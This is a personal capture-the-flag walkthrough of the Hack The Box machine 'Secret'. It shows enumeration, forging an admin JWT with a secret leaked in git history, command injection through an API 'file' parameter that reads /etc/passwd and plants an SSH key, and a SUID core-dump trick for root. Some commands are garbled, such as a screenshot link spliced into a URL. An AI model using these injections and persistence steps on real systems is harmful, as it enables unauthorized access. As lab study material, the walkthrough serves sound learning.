Box Info secret.htb
OS: Linux \
IP: 10.10.11.120  \

Part I Skills learned::  
AppSec, JS \ 

---
**Enumeration::**

nmap -p- -A -oN secretports.txt ${IP} ::
```
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)             
|_http-title: DUMB Docs                                 
3000/tcp open  http    Node.js (Express middleware)     
|_http-title: DUMB Docs                                 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 
```

gobuster dir -u http://<ip> -w /usr/share/wordlists/directory-list-1.0.txt ::
+ /docs, /api, /Docs, /API, /DOCS

ffuf -u http://secret.htb:FUZZ -w /usr/share/wordlists/subdomains-top1million-110000.txt:FUZZ | grep "Status: 200"
+ 80, #www, #mail, 080, 3000, #smtp #pop3

nikto -h http://secret.htb ::
+ Server: nginx/1.18.0 (Ubuntu)

http://secret.htb -> DL Source Code ::
+ Private.js UN:theadmin
+ Auth.js "l:30 const password:hashPaswrod -> l:23 const hashPaswrod = await bcrypt.hash(req.body.password, salt)"
+ popperjs/core v2.9.2
+ Bootstrap v5.0.2
+ http://secret.htb/docs#section-3 shows theadmin:root@dasith.works:Kekc8swFgD6zU (not SSH creds)
---
###**Step 1:**###
  + Create user::
```
# curl -i -X POST \                                                      
> -H 'Content-Type: application/json' \
> -d '{"name":"drtuser","email":"drt@dasith.works","password":"password123" \
> http:![](Screenshots/strapi_exploit_broken_shell.png)//10.10.11.120/api/user/login
```
# See ![create_user](Screenshots/secret_create_user.png) \

  + Login w/ user creds::
```
# curl -i -x POST \
> -H 'Content-Type: application/json' \
> -d '{"email":"drt@dasith.works","password":"password123" \
> http://10.10.11.120/api/user/login
```
# See ![login_user](Screenshots/login_secret.png) \

 `auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWNmNzY0NzlhN2U2NDA0NjAzOTNjNjgiLCJuYW1lIjoiZHJ0dXNlciIsImVtYWlsIjoiZHJ0QGRhc2l0aC53b3JrcyIsImlhdCI6MTY0MDk4NjYxM30.UxFx2kUzbFY_Ymt_LWQGq9FzeSEJktenzCT4vBZ_WBA`

###** JWT validation::**###
 + using none algorithm [jwt.IO](JWT.io) 
   + change alg: to None, NONE, n0ne, nOne :: Nope
 + hijacking another user
   + No users we know run this :: Nope
 + brute forcing the key [jwt_bruteforcer] (https://lmammino.github.io/jwt-cracker/) #npm install --global jwt-cracker
   + jwt-cracker "<jwt-token>"  "abcdefghijklmnopqrstuwxyz" 6 :: Nope Token too complex.
 + log into /api/prv fails ::`curl -w '\n' -H "auth-token: <jwt-token>" http://<ip>/api/priv` ::
     {"role":{"role":"you are normal user","desc":"drtuser"}} # See ![failed_priv](Screenshots/failed_jwt_api_priv_secret.png)

##**Step 2:**## 
 +.git folder has git log # See ![git_log_changes](Screenshots/git_log_changes.png)
    + "removed .env for security reasons"
    + open .env file in vim :: to view changes
    + `:r! git diff HEAD~2` ::
see Before ![before](Screenshots/before_git_diff.png) && \
see After ![after](Screenshots/after_git_diff.png) \
```
 DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+TOKEN_SECRET = secret
``` 
   + Create new token && sign into /api/priv See ![newJWT_login](Screenshots/newjwt_login.png)
   + cmd injection with jwt authenticated token. See ![cmd_jwt](Screenshots/cmd_injection_w_jwt.png)
```
# curl -i \                                                                                                                                          3 ⨯
> -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTkwMDg3YWYwM2VjMDA0NWVlNjg1M2YiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRydEBkYXNpdGgud29ya3MiLCJpYXQiOjE2MzY4Mjk2NDh9.ENKbUxgLeuUXueEMn5DG_2LZUJemd11E842rQ1ekzLg' \
> 'http://10.10.11.120/api/logs?file=index.js;id;cat+/etc/passwd' | sed 's/\\n/\n/g'
##File must be URL encoded for it to work with curl.
```

User is not a service therefore, a reverse shell is possible. 
    + First try to ssh 
    + Must attach SSH-public key to secret.htb server. Must be added to user's home dir to "authorized_machines"
`ssh-keygen -t rsa -b 4096 -C 'drt@htb' -f secret.htb -P '' #4096 bits, -C comment, -f name of ssh-key and -P is null`
    + in order to make sure SSH-key sticks:
```
    mkdir -p /home/dasith/.ssh
    echo $PUBLIC_KEY >> /home/dasith/.ssh/authorized_keys 
```
create bash variable::
`export PUBLIC_KEY=$(cat secret.htb.pub)`

curl command

```
curl \
  -i \ # print headers
  -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTkwMDg3YWYwM2VjMDA0NWVlNjg1M2YiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRydEBkYXNpdGgud29ya3MiLCJpYXQiOjE2MzY4Mjk2NDh9.ENKbUxgLeuUXueEMn5DG_2LZUJemd11E842rQ1ekzLg' \ 
  -G \ # send data values through GET instead of POST
  --data-urlencode "file=index.js; mkdir -p /home/dasith/.ssh; echo $PUBLIC_KEY >> /home/dasith/.ssh/authorized_keys" \ # encode data parameters
  'http://10.10.11.120/api/logs'
```
See ![200_ssh_key](Screenshots/200_add_ssh_key.png)

Key should be present now ssh into dasith! See ![ssh_dasith](Screenshots/ssh_dasith.png)
key:: f49628ceda5c0f784c6ae947154b764b

##**Root::**##
    + /opt has count with SUID
        ./count /root :: See ![](Screenshots/secret_count.png)
    + strace && gdb dont help much - suid doesnt stay gdb. strace map is private
+ Because valgrind.log is present, "core dump" is exploitable. valgrind is a suite of tools for debugging! lucky us!
See ![core_dump](Screenshots/core_dump_valgrind.png)
```
./count /root/root.txt
ctrl + z
ps && kill -BUS <PID#> ##Apparently -BUS is same as -SIGSEGV
fg ::
"Bus error (core dumped)
```
+ crash reports are in `/var/crash` && can be unpacked with `apport-unpack` w/ `apport-unpack /var/crash/_opt_count.1000.crash /tmp/crash-report`
+ binary files so xxd is needed.

---
##**References:**###
[jwt.IO](JWT.io) 
[guide](https://drt.sh/posts/htb-secret/)
[jwt-cracker](https://github.com/lmammino/jwt-cracker)
[valgrind](https://www.man7.org/linux/man-pages/man1/valgrind.1.html)
